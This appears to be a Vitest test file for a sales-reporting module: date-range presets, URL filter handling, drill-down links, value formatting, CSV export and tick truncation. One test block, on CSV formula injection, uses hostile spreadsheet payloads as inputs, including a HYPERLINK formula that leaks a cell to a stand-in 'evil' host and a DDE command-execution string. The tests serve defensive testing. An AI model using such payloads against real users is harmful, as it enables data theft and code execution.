import { describe, it, expect } from "vitest";
import dayjs from "dayjs";

import {
  PRESETS, DATE_BASES, presetRange, readFilters, writeFilters, toBody,
  formatValue, toCsv, leadsUrl, drillParams, GROUP_PARAM, idFilters, drillRange, truncTick } from "./reportUtils";

const TODAY = dayjs("2026-09-10");
const GROUP_BYS = [{ value: "source", label: "Source" }, { value: "owner", label: "Owner" }];
const params = (s) => new URLSearchParams(s);

describe("presetRange", () => {
  it.each([
    ["7d", "2026-09-04"],
    ["30d", "2026-08-12"],
    ["90d", "2026-06-13"],
    ["month", "2026-09-01"],
    ["custom", "2026-08-12"], // custom without dates behaves like 30d
  ])("%s starts on %s and ends today", (preset, from) => {
    expect(presetRange(preset, TODAY)).toEqual({ from, to: "2026-09-10" });
  });

  it("lists the five presets and three bases in order", () => {
    expect(PRESETS.map((p) => p.value)).toEqual(["7d", "30d", "90d", "month", "custom"]);
    expect(DATE_BASES.map((b) => b.value)).toEqual(["created", "closed", "activity"]);
  });
});

describe("readFilters", () => {
  it("defaults to 30d / created / first GroupBy / no ids", () => {
    expect(readFilters(params(""), { groupBys: GROUP_BYS, today: TODAY })).toEqual({
      preset: "30d", from: "2026-08-12", to: "2026-09-10", basis: "created", groupBy: "source",
      BranchId: null, OwnerId: null, SourceId: null, ProductId: null,
    });
  });

  it("reads a preset, basis, GroupBy and numeric ids", () => {
    const f = readFilters(params("preset=7d&basis=closed&groupBy=owner&BranchId=2&OwnerId=17&SourceId=x&ProductId=-1"), { groupBys: GROUP_BYS, today: TODAY });
    expect(f).toMatchObject({ preset: "7d", from: "2026-09-04", basis: "closed", groupBy: "owner", BranchId: 2, OwnerId: 17, SourceId: null, ProductId: null });
  });

  it("custom dates win: explicit from/to imply the custom preset", () => {
    const f = readFilters(params("from=2026-08-01&to=2026-08-31"), { groupBys: GROUP_BYS, today: TODAY });
    expect(f).toMatchObject({ preset: "custom", from: "2026-08-01", to: "2026-08-31" });
  });

  it("custom with a bad date falls back to the 30-day bound on that side", () => {
    const f = readFilters(params("preset=custom&from=01/08/2026&to=2026-08-31"), { groupBys: GROUP_BYS, today: TODAY });
    expect(f).toMatchObject({ preset: "custom", from: "2026-08-12", to: "2026-08-31" });
    // ...and the same on the other side, so a junk To does not drag From with it.
    const g = readFilters(params("preset=custom&from=2026-08-01&to=31-08-2026"), { groupBys: GROUP_BYS, today: TODAY });
    expect(g).toMatchObject({ preset: "custom", from: "2026-08-01", to: "2026-09-10" });
  });

  it("ignores unknown preset / basis / GroupBy values", () => {
    const f = readFilters(params("preset=year&basis=invoiced&groupBy=team"), { groupBys: GROUP_BYS, today: TODAY });
    expect(f).toMatchObject({ preset: "30d", basis: "created", groupBy: "source" });
  });
});

describe("a page's own default basis", () => {
  it("readFilters falls back to defaultBasis, and an explicit basis still wins", () => {
    // Lost keys on when the lead closed; "created" answers a different question.
    expect(readFilters(params(""), { groupBys: GROUP_BYS, defaultBasis: "closed", today: TODAY }))
      .toMatchObject({ basis: "closed" });
    expect(readFilters(params("basis=activity"), { groupBys: GROUP_BYS, defaultBasis: "closed", today: TODAY }))
      .toMatchObject({ basis: "activity" });
    // Omitted entirely -> the module default, so every existing caller is unchanged.
    expect(readFilters(params(""), { groupBys: GROUP_BYS, today: TODAY })).toMatchObject({ basis: "created" });
  });

  it("writeFilters keeps the page's default out of the URL", () => {
    const base = { preset: "30d", from: "2026-08-12", to: "2026-09-10", basis: "closed", groupBy: "reason", BranchId: null, OwnerId: null, SourceId: null, ProductId: null };
    expect(writeFilters(base, "closed")).toEqual({ groupBy: "reason" });
    expect(writeFilters(base)).toEqual({ groupBy: "reason", basis: "closed" });
    expect(writeFilters({ ...base, basis: "created" }, "closed")).toEqual({ groupBy: "reason", basis: "created" });
  });
});

describe("drill helpers", () => {
  const f = { from: "2026-08-01", to: "2026-08-31", basis: "created", groupBy: "source", BranchId: 2, OwnerId: null, SourceId: 11, ProductId: null };

  it("idFilters carries the four filter-bar ids so a drill is not wider than its row", () => {
    expect(idFilters(f)).toEqual({ BranchId: 2, OwnerId: null, SourceId: 11, ProductId: null });
  });

  it("drillRange carries the range only when it means CreatedAt on both sides", () => {
    expect(drillRange(f)).toEqual({ from: "2026-08-01", to: "2026-08-31" });
    // sp_FetchLeads narrows on CreatedAt, so a closed/activity range would
    // drill into a different set of leads than the row counted.
    expect(drillRange({ ...f, basis: "closed" })).toEqual({});
    expect(drillRange({ ...f, basis: "activity" })).toEqual({});
  });

  it("drillParams drops the range on a non-created basis but keeps ids and the group", () => {
    expect(drillParams({ ...f, basis: "closed" }, { GroupKey: 12 })).toEqual({
      BranchId: 2, OwnerId: null, SourceId: 12, ProductId: null,
    });
  });
});

describe("writeFilters / toBody", () => {
  const base = { preset: "30d", from: "2026-08-12", to: "2026-09-10", basis: "created", groupBy: "source", BranchId: null, OwnerId: null, SourceId: null, ProductId: null };

  it("writes only what differs from the defaults, groupBy always", () => {
    expect(writeFilters(base)).toEqual({ groupBy: "source" });
    expect(writeFilters({ ...base, preset: "7d", basis: "closed", OwnerId: 17 })).toEqual({ groupBy: "source", preset: "7d", basis: "closed", OwnerId: "17" });
    expect(writeFilters({ ...base, preset: "custom", from: "2026-08-01", to: "2026-08-31" })).toEqual({ groupBy: "source", preset: "custom", from: "2026-08-01", to: "2026-08-31" });
  });

  it("round-trips through readFilters", () => {
    const f = { ...base, preset: "custom", from: "2026-08-01", to: "2026-08-31", basis: "activity", groupBy: "owner", BranchId: 2 };
    expect(readFilters(params(new URLSearchParams(writeFilters(f)).toString()), { groupBys: GROUP_BYS, today: TODAY })).toEqual(f);
  });

  it("toBody is the report POST contract", () => {
    expect(toBody({ ...base, OwnerId: 17 })).toEqual({
      FromDate: "2026-08-12", ToDate: "2026-09-10", DateBasis: "created", GroupBy: "source",
      BranchId: null, OwnerId: 17, SourceId: null, ProductId: null,
    });
  });
});

describe("formatValue", () => {
  it.each([
    ["int", 1234, "1,234"],
    ["int", 0, "0"],
    ["pct", 12.345, "12.3%"],
    ["money", 85000, "₹85,000.00"],
    ["days", 2.25, "2.3 d"],
    ["hours", 5, "5.0 h"],
    ["date", "2026-09-07", "07-09-2026"],
    ["date", "not a date", "not a date"],
    ["text", "Price", "Price"],
    [undefined, 7, "7"],
  ])("%s formats %j as %s", (format, v, out) => {
    expect(formatValue(format, v)).toBe(out);
  });

  it("renders an em dash for nothing", () => {
    expect(formatValue("int", null)).toBe("—");
    expect(formatValue("pct", undefined)).toBe("—");
    expect(formatValue("text", "")).toBe("—");
  });
});

describe("toCsv", () => {
  it("writes a header row and escapes commas, quotes and newlines", () => {
    const cols = [{ key: "GroupLabel", header: "Source" }, { key: "Created", header: "Created, total" }];
    const rows = [{ GroupLabel: "Web \"organic\"", Created: 5 }, { GroupLabel: "Walk-in\nstore", Created: null }];
    expect(toCsv(cols, rows)).toBe('Source,"Created, total"\n"Web ""organic""",5\n"Walk-in\nstore",');
  });
});

describe("toCsv formula injection", () => {
  const cols = [{ key: "GroupLabel", header: "Rep" }, { key: "Leads", header: "Leads" }];

  // tblUser.FullName is self-service, so the lowest-privileged rep can set it
  // and a manager opens the export. Quoting alone does not help: Excel strips
  // the quotes and still evaluates a cell starting "=".
  it.each([
    ['=HYPERLINK("http://evil/?d="&A2,"bonus")', "'=HYPERLINK"],
    ["+1-800-EVIL", "'+1-800-EVIL"],
    ["-2+3+cmd|' /C calc'!A0", "'-2+3+cmd"],
    ["@SUM(1+1)", "'@SUM(1+1)"],
    ["\tLeading tab", "'\tLeading tab"],
  ])("neutralises %s", (name, startsWith) => {
    const out = toCsv(cols, [{ GroupLabel: name, Leads: 1 }]).split("\n")[1];
    const cell = out.startsWith('"') ? out.slice(1) : out;
    expect(cell.startsWith(startsWith)).toBe(true);
  });

  it("leaves ordinary text and real negative numbers alone", () => {
    expect(toCsv(cols, [{ GroupLabel: "Amit Singh", Leads: -5 }])).toBe("Rep,Leads\nAmit Singh,-5");
  });

  it("quotes a bare carriage return so one name cannot split a row", () => {
    // A lone CR is a record separator to most parsers: without quoting, one
    // display name silently becomes two rows and every later column shifts.
    const out = toCsv(cols, [{ GroupLabel: "Ravi\rKumar", Leads: 2 }]);
    expect(out).toBe('Rep,Leads\n"Ravi\rKumar",2');
  });
});

describe("leadsUrl / drillParams", () => {
  it("builds the Leads list URL without empty values", () => {
    expect(leadsUrl({ SourceId: 11, OwnerId: null, from: "2026-08-01", to: "", BranchId: undefined })).toBe("/sales/leads?SourceId=11&from=2026-08-01");
    expect(leadsUrl({})).toBe("/sales/leads");
  });

  it("maps the row's group onto the matching Leads filter and carries the range + active filters", () => {
    const f = { groupBy: "source", from: "2026-08-01", to: "2026-08-31", BranchId: 2, OwnerId: null, SourceId: null, ProductId: null };
    expect(drillParams(f, { GroupKey: 11, GroupLabel: "Website" })).toEqual({
      BranchId: 2, OwnerId: null, SourceId: 11, ProductId: null, from: "2026-08-01", to: "2026-08-31",
    });
    // Key order is part of the contract: the URL is asserted as a string elsewhere.
    expect(leadsUrl(drillParams(f, { GroupKey: 11 }))).toBe("/sales/leads?from=2026-08-01&to=2026-08-31&BranchId=2&SourceId=11");
  });

  it("adds nothing for a grouping the list cannot filter by, or a null key", () => {
    const f = { groupBy: "team", from: "2026-08-01", to: "2026-08-31", BranchId: null, OwnerId: null, SourceId: null, ProductId: null };
    expect(drillParams(f, { GroupKey: 16 })).toEqual({ BranchId: null, OwnerId: null, SourceId: null, ProductId: null, from: "2026-08-01", to: "2026-08-31" });
    // A null GroupKey writes nothing: the active SourceId filter survives it,
    // and a row with no key drills to the same list the filters already show.
    expect(drillParams({ ...f, groupBy: "source", SourceId: 4 }, { GroupKey: null })).toMatchObject({ SourceId: 4 });
    expect(drillParams({ ...f, groupBy: "source" }, { GroupKey: null })).toEqual(drillParams(f, { GroupKey: null }));
    expect(GROUP_PARAM.status).toBe("StatusId");
  });
});

// Regression, 2026-09-19: resolution and category names are free text the
// company writes in Settings ("Replaced under warranty"). Left whole on a
// 360px X axis, recharts overlapped them or silently dropped every other
// tick, and the reader could no longer tell which bar was which.
describe("truncTick", () => {
  it("leaves a label that already fits alone", () => {
    expect(truncTick("Hardware")).toBe("Hardware");
    expect(truncTick("Twelve chars")).toBe("Twelve chars");
  });

  it("shortens a longer one to twelve characters including the ellipsis", () => {
    expect(truncTick("Replaced under warranty")).toBe("Replaced un…");
    expect(truncTick("Replaced under warranty")).toHaveLength(12);
  });

  it("passes a non-string tick straight through", () => {
    expect(truncTick(2026)).toBe(2026);
    expect(truncTick(undefined)).toBeUndefined();
  });
});
